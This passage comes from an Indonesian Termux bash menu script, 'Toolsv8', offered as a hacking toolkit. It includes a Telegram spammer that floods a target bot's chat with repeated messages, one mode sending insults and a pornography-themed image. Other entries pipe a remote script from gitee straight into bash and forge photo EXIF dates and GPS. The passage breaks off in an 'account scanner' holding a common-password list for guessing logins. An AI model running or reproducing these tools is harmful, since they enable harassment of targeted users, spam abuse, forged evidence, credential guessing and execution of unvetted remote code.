  -d "{\"long_url\": \"$LONG_URL\"}")
bitly_link=$(echo "$bitly_response" | grep -oP '"link":\s*"\K[^"]+')
echo -e "   🔗 ${g}Shortlink:${y} $bitly_link\n"
echo ""
echo -e "${r}[ ${g}02 ${r}]${n} TinyURL"
tinyurl_response=$(curl -s -X POST "https://api.tinyurl.com/create" \
  -H "Authorization: Bearer $TINYURL_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"$LONG_URL\"}")
tinyurl_link=$(echo "$tinyurl_response" | grep -oP '"tiny_url":\s*"\K[^"]+' | sed 's#\\##g')
echo -e "   🔗 ${g}Shortlink:${y} $tinyurl_link"
echo ""
echo -e "${r}[ ${g}03 ${r}]${n} Cutt.ly"
cuttly_response=$(curl -s -G "https://cutt.ly/api/api.php" \
  --data-urlencode "key=$CUTTLY_API_KEY" \
  --data-urlencode "short=$LONG_URL")
cuttly_link=$(echo "$cuttly_response" | grep -oP '"shortLink":\s*"\K[^"]+' | sed 's#\\##g')
echo -e "   🔗 ${g}Shortlink:${y} $cuttly_link"
echo ""
echo -e "${c}🎉 URL berhasil dipendekkan menggunakan 3 layanan!"
echo ""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
               ;;
        28)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
              mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
              echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
echo ""
echo -e "${yellow} Gunakan Link Upload Gambar ini : ${cyan}https://top4top.io"
echo -e "${green}================================================"
echo -e "${red}       Spammer Telegram By.Thonxyzz404"
echo -e "${green}================================================"
echo ""
echo -e "${r}[ ${g}01 ${r}] ${cyan}Spam Teks Biasa"
echo -e "${r}[ ${g}02 ${r}] ${cyan}Spam Teks Auto Virtex"
echo -e "${r}[ ${g}03 ${r}] ${cyan}Spam Teks + Gambar + Video + Audio"
echo -e "${r}[ ${g}04 ${r}] ${cyan}Spam Auto Hitam Bokep"
echo -e "${r}[ ${g}00 ${r}] ${yellow}Kembali Ke Toolsv8."
echo -e "${green}"
read -p "Silahkan Pilih : " kuy
case $kuy in
 1|01)
send_text_message() {
    TOKEN=$1
    CHAT_ID=$2
    MESSAGE=$3
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
     -d chat_id="$CHAT_ID" \
     -d text="$MESSAGE" > /dev/null 2>&1
}
loading_bar() {
frames=(
"[\e[1;91m■\e[0m□□□□□□□□□]"
"[\e[1;92m■■\e[0m□□□□□□□□]"
"[\e[1;93m■■■\e[0m□□□□□□□]"
"[\e[1;94m■■■■\e[0m□□□□□□]"
"[\e[1;95m■■■■■\e[0m□□□□□]"
"[\e[1;96m■■■■■■\e[0m□□□□]"
"[\e[1;97m■■■■■■■\e[0m□□□]"
"[\e[1;92m■■■■■■■■\e[0m□□]"
"[\e[1;93m■■■■■■■■■\e[0m□]"
"[\e[1;94m■■■■■■■■■■\e[0m]"
  )
  local count=0
  while [ $count -lt $SPAM_COUNT ]; do
    for frame in "${frames[@]}"; do
      send_text_message "$BOT_TOKEN" "$CHAT_ID" "$MESSAGE"
      count=$((count+1))
      echo -ne "\r$frame"
      sleep 0.01
      if [ $count -ge $SPAM_COUNT ]; then
        break
      fi
    done
  done
  echo ""
  echo -e "${y}Sukses Pengiriman Dalam Totall ${r}: ${c}${SPAM_COUNT}"
}
echo -e "${c}"
read -p "Masukkan Pesan Teks : " MESSAGE
echo -e "${y}"
read -p "Masukkan Token Botz Target : " BOT_TOKEN
echo -e "${r}"
read -p "Masukkan Chat ID Target : " CHAT_ID
echo -e "${g}"
read -p "Masukkan Jumlah Spam Pesan Yang Ingin Dikirim : " SPAM_COUNT
echo ""
echo -e "${purple}Sedang proses spam...!!"
echo ""
loading_bar
       ;;
2|02)
clear
echo "
 ▗▄▄▖▗▄▄▄▖▗▄▄▖ ▗▖  ▗▖▗▄▄▄▖▗▄▄▖ 
▐▌   ▐▌   ▐▌ ▐▌▐▌  ▐▌▐▌   ▐▌ ▐▌
 ▝▀▚▖▐▛▀▀▘▐▛▀▚▖▐▌  ▐▌▐▛▀▀▘▐▛▀▚▖
▗▄▄▞▘▐▙▄▄▖▐▌ ▐▌ ▝▚▞▘ ▐▙▄▄▖▐▌ ▐▌
" | lolcat
echo -e "${g}===============${r} Server Website ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading....!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading....!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://muka-lu-kontol.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA WEBSITE SERVER."
echo ""
  ;;
  3|03)
    loading_bar() {
    frames=(
        "[\e[1;91m■\e[0m□□□□□□□□□]"
        "[\e[1;92m■■\e[0m□□□□□□□□]"
        "[\e[1;93m■■■\e[0m□□□□□□□]"
        "[\e[1;94m■■■■\e[0m□□□□□□]"
        "[\e[1;95m■■■■■\e[0m□□□□□]"
        "[\e[1;96m■■■■■■\e[0m□□□□]"
        "[\e[1;97m■■■■■■■\e[0m□□□]"
        "[\e[1;92m■■■■■■■■\e[0m□□]"
        "[\e[1;93m■■■■■■■■■\e[0m□]"
        "[\e[1;94m■■■■■■■■■■\e[0m]"
    )
    while :; do
        for frame in "${frames[@]}"; do
            echo -ne "\r$frame Mengirim...!!"
            sleep 0.2
        done
    done
}
echo -e "${cyan}"
read -p "Masukkan Token Botz : " token
echo -e "${green}"
read -p "Masukkan ID Botz : " chat_id
echo -e "${cyan}"
read -p "Masukkan Pesan Untuk Botz : " text
echo -e "${yellow}"
read -p "Masukkan Image Url Gambar Anda : " photo_url
echo -e "${cyan}"
read -p "Masukkan Video Url Anda : " video_url
echo -e "${green}"
read -p "Masukkan Audio Url Anda : " audio_url
echo -e "${yellow}"
read -p "Masukkan Jumlah Spam : " jumlah
echo ""
if ! [[ "$jumlah" =~ ^[0-9]+$ ]]; then
    echo -e "${red}Error : Jumlah Harus Berupa Angka...!!"
    echo ""
    echo -e "${green}Tekan Enter Untuk Kembali ke Toolsv8!!!"
    read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
    clear
fi
loading_bar &
pid=$!
for ((i = 0; i < jumlah; i++)); do
    if [[ -n "$photo_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendPhoto" \
            -F "chat_id=${chat_id}" \
            -F "photo=${photo_url}" \
            -F "caption=${text}" > /dev/null
    fi
    if [[ -n "$video_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendVideo" \
            -F "chat_id=${chat_id}" \
            -F "video=${video_url}" \
            -F "caption=${text}" > /dev/null
    fi
    if [[ -n "$audio_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendAudio" \
            -F "chat_id=${chat_id}" \
            -F "audio=${audio_url}" \
            -F "caption=${text}" > /dev/null
    fi
    if [[ -z "$photo_url" && -z "$video_url" && -z "$audio_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendMessage" \
            -d "chat_id=${chat_id}" \
            -d "text=${text}" > /dev/null
    fi
done
kill $pid
wait $pid 2>/dev/null
echo -e "${green} Proses selesai dengan jumlah : ${jumlah}"
  ;;
4|04)
echo -e "${p}"
read -p "Masukkan Bot Token : " TOKEN
echo -e "${c}"
read -p "Masukkan Chat ID : " CHAT_ID
echo -e "${y}"
read -p "Masukkan jumlah pengiriman : " JUMLAH
echo ""
if [[ -z "$TOKEN" || -z "$CHAT_ID" || -z "$JUMLAH" ]]; then
    clear 
    echo ""
    echo -e "${c}Token, Chat ID, atau Jumlah tidak boleh kosong!"
    echo ""
fi
if ! [[ "$JUMLAH" =~ ^[0-9]+$ ]] || [[ "$JUMLAH" -lt 1 ]]; then
    clear 
    echo ""
    echo -e "${g}Jumlah harus angka positif!"
    echo ""
fi
PHOTO_URL="https://l.top4top.io/p_3539d0y7d1.jpg"
AUDIO_URL="https://h.top4top.io/m_3588buygi1.mp3"
CAPTION="Bang Bokep Nih Bang Enak Hahaha 😹🖕"
loading_bar() {
    local pid=$1
    frames=(
        "[\e[1;91m■\e[0m□□□□□□□□□]"
        "[\e[1;92m■■\e[0m□□□□□□□□]"
        "[\e[1;93m■■■\e[0m□□□□□□□]"
        "[\e[1;94m■■■■\e[0m□□□□□□]"
        "[\e[1;95m■■■■■\e[0m□□□□□]"
        "[\e[1;96m■■■■■■\e[0m□□□□]"
        "[\e[1;97m■■■■■■■\e[0m□□□]"
        "[\e[1;92m■■■■■■■■\e[0m□□]"
        "[\e[1;93m■■■■■■■■■\e[0m□]"
        "[\e[1;94m■■■■■■■■■■\e[0m]"
    )
    while kill -0 $pid 2>/dev/null; do
        for frame in "${frames[@]}"; do
            printf "\r$frame Mengirim [$COUNTER/$JUMLAH]..!!"
            sleep 0.12
        done
    done
    printf "\r%-60s\r" ""
}
echo -e "${r}[ ${g}✓ ${r}]${g} Sedang proses..!!"
echo ""
COUNTER=0
for (( i=1; i<=JUMLAH; i++ )); do
    COUNTER=$i
    CAPTION_LOOP="Goblok Lu Sangean Tolol Lu Awokawok 😂🤣"
    (
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" \
            -F "chat_id=$CHAT_ID" \
            -F "photo=$PHOTO_URL" \
            -F "caption=$CAPTION_LOOP" > /dev/null
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendAudio" \
            -F "chat_id=$CHAT_ID" \
            -F "audio=$AUDIO_URL" \
            -F "caption=$CAPTION_LOOP" > /dev/null
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Botz sudah hitam tuan sudah selesai ${r}[ ${g}$i ${r}]"
    ) &
    loading_bar $!
    wait $!
    echo -e "${g}Kirim ke $i selesai."
    sleep 2 
done
echo ""
echo -e "${c}SUCCESS : Semua $JUMLAH pesan berhasil dikirim!"
echo -e "${y}========================================"
echo ""
  ;;
esac
echo ""
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
      29)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
if ! command -v exiftool &> /dev/null; then
echo ""
echo "ExifTool tidak ditemukan. Instal dengan menjalankan:"
echo ""
$paket install exiftool -y
clear
fi
banner() {
echo -e "███████╗██╗  ██╗██╗███████╗
██╔════╝╚██╗██╔╝██║██╔════╝
█████╗   ╚███╔╝ ██║█████╗
██╔══╝   ██╔██╗ ██║██╔══╝
███████╗██╔╝ ██╗██║██║
╚══════╝╚═╝  ╚═╝╚═╝╚═╝   TOOLSV8 By.Thonxyzz404
"
}
show_menu() {
echo "====================================="
echo "EXIF Metadata Editor (Kompatibel Termux)"
echo "====================================="
echo "1. Ubah Tanggal (DateTimeOriginal, CreateDate, ModifyDate)"
echo "2. Ubah Judul (Title)"
echo "3. Ubah Artis (Artist)"
echo "4. Tambah Lokasi GPS"
echo "5. Ubah Deskripsi (Description)"
echo "6. Ubah Copyright (Hak Cipta)"
echo "7. Ubah Nama Kamera"
echo "8. Hapus Metadata"
echo "9. Lihat Metadata"
echo "10. Keluar"
}
read_file() {
IFS= read -r -e -p "Masukkan path file : " file
if [ ! -f "$file" ]; then
echo "File tidak ditemukan : $file"
fi
}
update_date() {
read_file
IFS= read -r -e -p "Masukkan tanggal baru (format: YYYY:MM:DD HH:MM:SS) : " date
exiftool -DateTimeOriginal="$date" -CreateDate="$date" -ModifyDate="$date" "$file"
echo "Tanggal berhasil diubah!"
}
update_title() {
read_file
IFS= read -r -e -p "Masukkan judul baru : " title
exiftool -Title="$title" "$file"
echo "Judul berhasil diubah!"
}
update_artist() {
read_file
IFS= read -r -e -p "Masukkan nama artis baru : " artist
exiftool -Artist="$artist" "$file"
echo "Artis berhasil diubah!"
}
add_gps() {
read_file
IFS= read -r -e -p "Masukkan Latitude (contoh: 37.7749) : " latitude
IFS= read -r -e -p "Masukkan Longitude (contoh: -122.4194) : " longitude
IFS= read -r -e -p "Masukkan Altitude (opsional, contoh: 15.0) : " altitude
exiftool -GPSLatitude="$latitude" -GPSLongitude="$longitude" -GPSAltitude="$altitude" "$file"
echo "Lokasi GPS berhasil ditambahkan!"
}
update_description() {
read_file
IFS= read -r -e -p "Masukkan deskripsi baru : " description
exiftool -ImageDescription="$description" "$file"
echo "Deskripsi berhasil diubah!"
}
update_copyright() {
read_file
IFS= read -r -e -p "Masukkan hak cipta baru : " copyright
exiftool -Copyright="$copyright" "$file"
echo "Copyright berhasil diubah!"
}
update_camera_name() {
read_file
IFS= read -r -e -p "Masukkan nama kamera baru : " camera
exiftool -Model="$camera" "$file"
echo "Nama kamera berhasil diubah!"
}
remove_metadata() {
read_file
exiftool -all= "$file"
echo "Semua metadata berhasil dihapus!"
}
view_metadata() {
read_file
exiftool "$file"
}
while true; do
clear
banner | lolcat
show_menu | lolcat
echo ""
IFS= read -r -e -p "Pilih opsi (1-10) : " choice
case $choice in
1)
update_date
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
2)
update_title
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
3)
update_artist
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
4)
add_gps
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
5)
update_description
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
6)
update_copyright
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
7)
update_camera_name
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
8)
remove_metadata
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
9)
view_metadata
IFS= read -r -e -p "Enter untuk kembali ke menu."
;;
10)
echo "Keluar dari program."
break
;;
*)
echo "Pilihan tidak valid. Coba lagi."
sleep 3
;;
esac
done
     echo ""
         echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
         read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
         clear
               ;;
        30)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
play -q $HOME/Goblok/Y.mp3 &> /dev/null &
echo "
.▄▄ · ▄▄▄ .▄▄▄   ▌ ▐·▄▄▄ .▄▄▄  
▐█ ▀. ▀▄.▀·▀▄ █·▪█·█▌▀▄.▀·▀▄ █·
▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐█▐█•▐▀▀▪▄▐▀▀▄ 
▐█▄▪▐█▐█▄▄▌▐█•█▌ ███ ▐█▄▄▌▐█•█▌
 ▀▀▀▀  ▀▀▀ .▀  ▀. ▀   ▀▀▀ .▀  ▀
 " | lolcat
echo -e "${blue}==========================="
echo -e "${red}     Auto All Hacking "
echo -e "${blue}==========================="
echo ""
echo -e "${red}[ ${green}01 ${red}]${yellow} View Tiktok Link"
echo -e "${red}[ ${green}02 ${red}]${yellow} Gett informasi WhatsApp"
echo -e "${red}[ ${green}03 ${red}]${yellow} Claude Terminall"
echo -e "${red}[ ${green}04 ${red}]${yellow} Hapus Teks Termux"
echo -e "${red}[ ${green}05 ${red}]${yellow} Getcontak Link"
echo -e "${red}[ ${green}06 ${red}]${yellow} Cek Hosnem Website"
echo -e "${red}[ ${green}07 ${red}]${yellow} Mode All Termux"
echo -e "${red}[ ${green}08 ${red}]${yellow} Html encripi link"
echo -e "${red}[ ${green}09 ${red}]${yellow} Terminal,in 4 bagian"
echo -e "${red}[ ${green}10 ${red}]${cyan} Kembali Ke Toolsv8."
echo ""
echo -e "${blue}==========================="
echo -e "${green}"
read -p "Silahkan masukkan pilihan anda : " kuy
case $kuy in
    1|01)
        clear 
        xdg-open "https://zefoy.com/"
        clear
        ;;
    2|02)
        clear 
        xdg-open "https://whatsApp.checkleaked.cc/"
        clear
        ;;
   3|03)
        clear 
        xdg-open "https://shell.cloud.google.com/?show=terminal&pli=1&authuser=6&fromcloudshell=true"
        clear
         ;;
    4|04)
           clear 
           echo ""
           echo -e "${green}Jika Sudah Terhapus di bagian Teks Termux Silahkan Ikuti Printah Saya!!"
           sleep 6
           clear
           echo ""
           echo -e "${cyan}Tekan Tombol CTRL + X"
           sleep 6
           clear
           echo ""
           echo -e "${green}Ketika Sudah Menghapus Bagian Teks Termux!!"
           sleep 6
           clear
           echo ""
           echo -e "${red}Lalu Keluar Dari Termux Dan Seperti Biasa Login Lagi ke Termux Ketika Sudah Menekan Tombol Exit!!"
           sleep 6
           clear
           echo ""
           echo -e "${purple}Running SCRIPT Sedang Berjalan!!"
           sleep 4
           clear
           nano ../usr/etc/motd
           echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
           read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
           clear
         ;;
    5|05)
         echo ""
         echo -e "${g} Sedang Membuka Link Getcontak...!!"
         echo ""
         xdg-open "https://tools.naufalist.com/getcontact"
         echo ""
         echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
         read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
         clear
           ;;
  6|06)
        clear 
        xdg-open "https://check-host.net/"
        clear
         ;;
   7|07)
        clear 
        echo ""
        echo -e "${c} Sedang membuka mode all...!!"
        sleep 2
        echo -e "${g}"
        pkg install -y curl ; bash -c "$(curl -L gitee.com/mo2/linux/raw/2/2)"
          ;;
    8|08)
         echo ""
         echo -e "${g} Sedang Membuka Link Encripi...!!"
         echo ""
         xdg-open "https://tools.prinsh.com/home/?tools=html-encrypt"
         echo ""
         echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
         read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
         clear
          ;;
    9|09)
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
command -v tmux >/dev/null 2>&1 || {
    clear
    echo ""
    echo -e "${r}[ ${g}x ${r}]${y} Modules tmux blum terinstal, Menginstal..!!"
    sleep 2 
    echo -e "${n}"
    pkg install tmux -y
    clear 
}
clear
echo "
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛🟥🟥🟥🟥⬛🟩🟩🟩🟩⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛🟦🟦🟦🟦⬛🟨🟨🟨🟨⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
"
echo -e "${g}"
read -p "Apakah kamu ingin membuat 4 terminal? (y/n) : " jawab
if [[ "$jawab" == "y" || "$jawab" == "Y" ]]; then
    tmux new-session \; \
        split-window -h \; \
        split-window -v \; \
        select-pane -t 0 \; \
        split-window -v \; \
        select-layout tiled
elif [[ "$jawab" == "n" || "$jawab" == "N" ]]; then
    echo ""
    echo -e "${c} Keluar dari tools..!!"
    echo ""
else
    clear 
    echo ""
    echo -e "${y} Pilihan tidak valid, membuka tmux default..!!"
    echo ""
    sleep 2 
    clear
    tmux
fi
 ;;
    10)
        clear 
        ;;       
    *)
        echo -e "${red}Pilihan Tidak Valid...!!"
        sleep 2
        ;;
esac
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
        ;;
 31)
           echo ""
           mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
           echo -e "${cyan} Anda Memilih Menu Hacking...!!"
           echo ""
           echo -e "${red} VIP UNLOCK...!!"
           sleep 2
           clear
           cd 
b='\033[1;34m'
g='\033[1;32m'
p='\033[1;35m'
c='\033[1;36m'
r='\033[1;31m'
y='\033[1;33m'
n='\033[0m'
function print_banner() {
  clear
  echo -e "${g}
███████╗ ██████╗ ██╗  ██╗███████╗
██╔════╝██╔═══██╗╚██╗██╔╝██╔════╝
█████╗  ██║   ██║ ╚███╔╝ ███████╗
██╔══╝  ██║   ██║ ██╔██╗ ╚════██║
██║     ╚██████╔╝██╔╝ ██╗███████║
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝
"
  echo -e "${g} Developer ${c}: ${p}By.Thonxyzz404 "
  echo -e "${y} Tools ${c}: ${p}Multi-Platform Account Security Scanner"
}
COMMON_PASSWORDS=(
  password 123456 12345678 123456789 12345 1234 111111 123123 123321 000000
  qwerty abc123 qwertyuiop asdfghjkl zxcvbnm qazwsx 1q2w3e 1q2w3e4r 6543216
  letmein iloveyou admin welcome monkey football baseball dragon master shadow
  sunshine princess trustno1 superman michael jordan hunter jessica lovely daniel9
  access buster thomas charlie ginger michelle pepper secret forever flower summer
  cookie angel computer bunny george tigger soccer killer bandit maggie snoopy2368
  batman matrix passw0rd starwars qazxsw test1 hello1 welcome1 admin123 123qw
  123abc 321cba love123 159753 987654 112233 789456 147258 369258 258369 Qet08
  mypassword 1password yourname default unknown guest user1 root 123000 111222
  temp123 login123 home123 start123 easy123 lucky123 qtihd023 Wxtz906 T8063 txuc0
  admin123 roy231 joy52 kontol02 povem123 hengker123 mohyamin521 pintre332 pitri2
  roblem123 roblokyz214 putri123 aiuser2025 neuralNet88 deepHack92 alphaBot321 9074
  quantumCode22 cyberKing77 pass123AI matrixx404 zeroHack01 botlover99 rootaccess2025
  bruteForce22 iloveai143 darknetX23 sintelAI2023 visionbot33 agent_ai007 hackmeplease79
  shadowRootX autobot81 superuser@ai ai_robot2024 hackedbyai pythonic123 mluserX44051
  roboGirl99 neuralpass321 dreamAIpass testbot998 ai_master2025 matrix_codeX bytecrack23
  anonyai888 sigmoid66 encryptMe2025 techno456ai hydraBot77 godmode404 synapse995222
  binary_kode airockz2023 cmdline_221 databot2025 skynet_ai01 brainstormai alphaForce115
  botpowerx7 termux_user9 roboHack lambda99 torchpass123 aiisreal321 deepfakenow097
  cryptohack01 quantpass777 brainAI2025 deepCrack2 xploitai22 autohack33 passmatrix77
  reversebot anonAIpass injectcodeX deepcode221 leakdetector aicrack321 hardpass_ai
  spynet77 autobotx22 stealthai77 rootforce999 neuralV01ce mlhackerrrr superbot432
  shellai_test aimodeon99 usersploit run4AIlife futurhax23 passprobz44 cyborgx002
  cybernetix crackbrain99 scriptAIpass safe_ai_42 cmdpassX multiuser77 adminAIs02
  xpl0it4i mechaRoot
)
  function detect_platform() {
  local input="$1"
  local lower=$(echo "$input" | tr '[:upper:]' '[:lower:]')
  if echo "$lower" | grep -E '^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$' >/dev/null; then
